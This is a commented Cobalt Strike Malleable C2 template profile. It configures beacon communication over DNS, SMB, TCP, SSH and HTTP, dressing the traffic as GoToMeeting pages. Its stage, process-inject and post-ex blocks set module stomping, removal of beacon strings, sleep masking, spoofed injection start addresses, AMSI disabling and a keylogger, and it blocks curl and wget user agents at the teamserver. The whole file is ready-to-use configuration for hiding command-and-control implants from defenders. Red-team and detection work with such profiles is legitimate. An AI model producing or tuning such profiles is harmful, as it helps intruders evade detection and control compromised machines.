#template profile - updated with 4.3 options.
#options from https://www.cobaltstrike.com/help-malleable-c2 and https://www.cobaltstrike.com/help-malleable-postex
#attempt to get everything in one place with examples.
#xx0hcd

###global options###

#shows profile name in reports.
set sample_name "whatever.profile";

set sleeptime "37500";
set jitter    "33";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/587.38 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36";

#Append random-length string (up to data_jitter value) to http-get and http-post server output.
set data_jitter "50";

#set true to use staged payloads, false to disable staged payloads.
set host_stage "false";

###DNS options###
dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}

###SMB options###
#use different strings for pipename and pipename_stager.
set pipename "ntsvcs##";
set pipename_stager "scerpc##";
set smb_frame_header "";

###TCP options###
set tcp_port "8000";
set tcp_frame_header "";

###SSH options###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

###SSL Options###
#custom cert
#https-certificate {
    #set keystore "your_store_file.store";
    #set password "your_store_pass";
#}

#self sign cert
https-certificate {
    set C "US";
    set CN "whatever.com";
    set L "California";
    set O "whatever LLC.";
    set OU "local.org";
    set ST "CA";
    set validity "365";
}

###HTTPS_CERTIFICATE VARIANT###
#https-certificate "varinat_name_self" {
#    set C "US";
#    set CN "whatever2.com";
#    set L "Florida";
#    set O "whatever2 LLC.";
#    set OU "local.org";
#    set ST "FL";
#    set validity "365";
#}

#code sign cert.
#code-signer {
    #set keystore "your_keystore.jks";
    #set password "your_password";
    #set alias "server";
#}

###HTTP-Config Block###
#Order of server response headers. Or you can just fill them in manually under the server blocks.
#c2lint msg -> .http-config should not set header 'Content-Type'. Let the web server set the value for this field.
http-config {
    set headers "Server, Content-Type, Cache-Control, Connection";
    header "Connection" "close";
    header "Cache-Control" "max-age=2";
    header "Server" "nginx";
    #set "true" if teamserver is behind redirector
    set trust_x_forwarded_for "false";
    #can set whether you want to remove the UA that teamserver blocks by default
    set block_useragents "curl*,lynx*,wget*";
}

#Comma-separated list of HTTP client headers to remove from Beacon C2. Assume it is for removing any headers added that are causing issues, just haven't ran into that in testing.
#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";

###HTTP-GET Block###
#the http-get block checks if there are tasks queued.

http-get {

#You can specifiy multiple URI's with space between them.
    set uri "/login /config /admin";

#default method is GET.
    set verb "GET";
    #set verb "POST";
    
    client {

#Set headers based on traffic capture/Burp/etc.
        header "Host" "whatever.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";

	   
    metadata {
#Encoding options = append "string", base64, base64url, mask, netbios, netbiosu, prepend "string".
        #base64
        base64url;
        #mask;
        #netbios;
        #netbiosu;
        #prepend "TEST123";
        append ".php";

#Termination statements = header "header", parameter "key", print, uri-append. 
        parameter "file";
        #header "Cookie";
        #uri-append;
#Have to set verb to POST if you want to use print in the client GET block.
        #print;


    }

#You can also add parameter values just to help mimic your site traffic.
    parameter "test1" "test2";

    }

    server {
#headers are defined in the http-config block above, or you can set them manually here.
        #header "Server" "nginx";
 
#the output keyword allows you to prepend/append data, to add site traffic, etc.       
        output {

            netbios;
            #netbiosu;
            #base64;
            #base64url;
            #mask;
            	    

#Use prepend and append to mix your data in with normal looking site traffic. Escape double quotes and you can also use '\n'. c2lint shows '\n' as a period, but you can run it through Burp or pcap a HTTP payload to make sure everything is lining up correctly. Prepend strings need to be entered in reverse order, so the first string here is '"<!DOCTYPE html>\n";'.
#Havent updated this in awhile, at some point MC2 profiles started displaying copy/paste traffic from Burp 'correctly'. I used to have to play around with spacing, etc. but now usually just copy entire lines in 'prepend' and 'append' terminating correctly.  
	    prepend "content=";
	    prepend "<meta name=\"google-site-verification\"\n";
	    prepend "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
	    prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n";
	    prepend "<link rel=\"canonical\" href=\"https://www.gotomeeting.com/b\">\n";
	    prepend "<title>Online Meeting Software with HD Video Conferencing | GoToMeeting</title>\n";
	    prepend "        <meta charset=\"UTF-8\">\n";
	    prepend "    <head>\n";
	    prepend "<html lang=\"en\">\n";
	    prepend "<!DOCTYPE html>\n";

	    append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
	    append "<script type=\"text/javascript\">\n";
	    append "  var _kiq = _kiq || [];\n";
	    append "  (function(){\n";
	    append "    setTimeout(function(){\n";
	    append "    var d = document, f = d.getElementsByTagName('script')[0], s =\n";
	    append "d.createElement('script'); s.type = 'text/javascript';\n";
	    append "    s.async = true; s.src = '//s3.amazonaws.com/ki.js/66992/fWl.js';\n";
	    append "f.parentNode.insertBefore(s, f);\n";
	    append "    }, 1);\n";
	    append "})();\n";
	    append "</script>\n";
	    append "</body>\n";
	    append "</html>\n";

#All server blocks use 'print' to termintate.
            print;
        }
    }
}

###HTTP-GET VARIANT###
#variants allow you to use multiple traffic profiles with a single teamserver. Define the block as normal adding a name for the variant in quotes.

http-get "variant_name_get" {
 
    set uri "/index"; 
    
    client {
        
        header "Accept" "*/*";
        header "Connection" "Keep-Alive";
       
    metadata {
        
    base64url;
    parameter "id";
    
    }
    
    parameter "param_key" "value";
    
  }
  
    server {
        
        header "Server" "Apache";
        
        output {
            netbios;

            prepend "<html>\n";

            append "'\n";         
            
            print;
        }
        
    }
  
}


#Blocks that support variants:
#
#    http-get
#    http-post
#    http-stager
#    https-certificate
#    dns-beacon

###HTTP-Post Block###
#The same transform and termination rules apply as the client GET section above.
#if tasks are queued then http-post block processes them.

http-post {
    
#URI's cannot be the same as the http-get block URI's, even changing one case is fine.
    set uri "/Login /Config /Admin";
    set verb "GET";
    #set verb "POST";

    client {


	header "Host" "whatever.com";
        header "Accept" "*/*";
        header "Accept-Language" "en";
	header "Connection" "close";     
        
        output {
            base64url; 
	    parameter "testParam";
        }

#You can put the beacon id in - parameter "key", header "header", 
#cannot add transform statements to beacon id.
        id {
	    base64url;
	    parameter "id";
            #header "ID-Header":

        }
    }

    server {
#headers are defined in the http-config block above, or you can set them manually here.
        #header "Server" "nginx";

        output {
            netbios;	    
	   
	    prepend "content=";
	    prepend "<meta name=\"google-site-verification\"\n";
	    prepend "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
	    prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n";
	    prepend "<link rel=\"canonical\" href=\"https://www.gotomeeting.com/b\">\n";
	    prepend "<title>Online Meeting Software with HD Video Conferencing | GoToMeeting</title>\n";
	    prepend "        <meta charset=\"UTF-8\">\n";
	    prepend "    <head>\n";
	    prepend "<html lang=\"en\">\n";
	    prepend "<!DOCTYPE html>\n";

	    append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
	    append "<script type=\"text/javascript\">\n";
	    append "  var _kiq = _kiq || [];\n";
	    append "  (function(){\n";
	    append "    setTimeout(function(){\n";
	    append "    var d = document, f = d.getElementsByTagName('script')[0], s =\n";
	    append "d.createElement('script'); s.type = 'text/javascript';\n";
	    append "    s.async = true; s.src = '//s3.amazonaws.com/ki.js/66992/fWl.js';\n";
	    append "f.parentNode.insertBefore(s, f);\n";
	    append "    }, 1);\n";
	    append "})();\n";
	    append "</script>\n";
	    append "</body>\n";
	    append "</html>\n";
            print;
        }
    }
}

###HTTP-POST VARIANT###
#variants allow you to use multiple traffic profiles with a single teamserver. Define the block as normal adding a name for the variant in quotes.

http-post "variant_name_post" {
    
    set uri "/html";
    #set verb "GET";
    set verb "POST";

    client {

	header "Accept" "*/*";
	header "Connection" "Keep-Alive";
	        
        output {
            base64url;
	    parameter "name";
	    
        }

        id {
	    base64url;
	    parameter "id";

        }
    }

    server {
    
        header "Server" "Apache";

        output {
            netbios;
            print;
        }
    }
}


###HTTP-Stager Block###
#Options to set if you are using a staged payload.
http-stager {

#Same URI rules apply as above, can't have URI's that match in any other client block.
    set uri_x86 "/Console";
    set uri_x64 "/console";

    client {
        header "Host" "whatever.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";
	
	#can use a parameter as well
	parameter "test1" "test2";
    }

    server {
#headers are defined in the http-config block above, or you can set them manually here.
        #header "Server" "nginx";
	
	output {
	
	    prepend "content=";
	    
	    append "</script>\n";
	    print;
	}

    }


}

###HTTP-Stager Variant###
#variants allow you to use multiple traffic profiles with a single teamserver. Define the block as normal adding a name for the variant in quotes.

http-stager "variant_name_stager" {

    set uri_x86 "/uri1";
    set uri_x64 "/uri2";

    client {
        header "Host" "whatever.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";
	
	#can use a parameter as well
	parameter "test1" "test2";
    }

    server {
#headers are defined in the http-config block above, or you can set them manually here.
        #header "Server" "nginx";
	
	output {
	
	    prepend "content=";
	    
	    append "</script>\n";
	    print;
	}

    }


}



###Malleable PE/Stage Block###
#use peclone on the dll you want to use, this example uses wwanmm.dll. You can also set the values manually.
#don't use 'set image_size_xx' if using 'set module_xx'. During testing it seemed to double the size of my payload causing module stomp to fail, need to test it out more though.
stage {
    set checksum       "0";
    set compile_time   "25 Oct 2016 01:57:23";
    set entry_point    "170000";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    #set name	   "WWanMM.dll";
    set userwx 	   "false";
    set cleanup	   "true";
    set sleep_mask	   "true";
    set stomppe	   "true";
    set obfuscate	   "true";
    set rich_header    "\xee\x50\x19\xcf\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xa3\x49\xe4\x9c\x84\x31\x77\x9c\x1e\xad\x86\x9c\xae\x31\x77\x9c\x1e\xad\x85\x9c\xa7\x31\x77\x9c\xaa\x31\x76\x9c\x08\x31\x77\x9c\x1e\xad\x98\x9c\xa3\x31\x77\x9c\x1e\xad\x84\x9c\x98\x31\x77\x9c\x1e\xad\x99\x9c\xab\x31\x77\x9c\x1e\xad\x80\x9c\x6d\x31\x77\x9c\x1e\xad\x9a\x9c\xab\x31\x77\x9c\x1e\xad\x87\x9c\xab\x31\x77\x9c\x52\x69\x63\x68\xaa\x31\x77\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    
    #obfuscate beacon before sleep.
    set sleep_mask "true";
    
    #https://www.cobaltstrike.com/releasenotes.txt -> + Added option to bootstrap Beacon in-memory without walking kernel32 EAT
    set smartinject "true";
    
    #new 4.2. options
    #allocator options include HeapAlloc, MapViewOfFile, VirtualAlloc, or you can use module stomp.
    #set allocator "HeapAlloc";
    #set magic_mz_x86 "MZRE";
    #set magic_mz_x64 "MZAR";
    #set magic_pe "EA";

#module stomp. Make sure the dll you use is bigger than your payload and test it with post exploit options to make sure everything is working.

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

#transform allows you to remove, replace, and add strings to beacon's reflective dll stage.
    transform-x86 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

#can set a string in the .rdata section of the beacon dll.
    #adds a zero-terminated string
    #string "something";

    #adds a string 'as-is'
    #data "something";

    #adds a wide (UTF-16LE encoded) string
    stringw "something"; 
}

###Process Inject Block###
#controls process injection behavior
process-inject {

    #Can use NtMapViewOfSection or VirtualAllocEx
    #NtMapViewOfSection only allows same arch to same arch process injection.
    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
 
    #prepend has to be valid code for current arch       
    transform-x86 {
        prepend "\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90";
    }

    execute {
        #Options to spoof start address for CreateThread and CreateRemoteThread, +0x<nums> for offset added to start address. docs recommend ntdll and kernel32 using remote process.

        #start address does not point to the current process space, fires SYSMON 8 events
        #CreateThread;
        #CreateRemoteThread;       

        #self injection
        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        #suspended process in post-ex jobs, takes over primary thread of temp process
        SetThreadContext;

        #early bird technique, creates a suspended process, queues an APC call to the process, resumes main thread to execute the APC.
        NtQueueApcThread-s;

        #uses an RWX stub, uses CreateThread with start address that stands out, same arch injection only.
        #NtQueueApcThread;

        #no cross session
        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";

        #uses an RWX stub, fires SYSMON 8 events, does allow x86->x64 injection.
        #c2lint msg -> .process-inject.execute RtlCreateUserThread will cause unpredictable behavior with cross-session injects on XP/200
        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";
    
    #new 4.2 options
    set thread_hint "ntdll.dll!RtlUserThreadStart";
    set pipename "DserNamePipe##";
    set keylogger "SetWindowsHookEx";

}
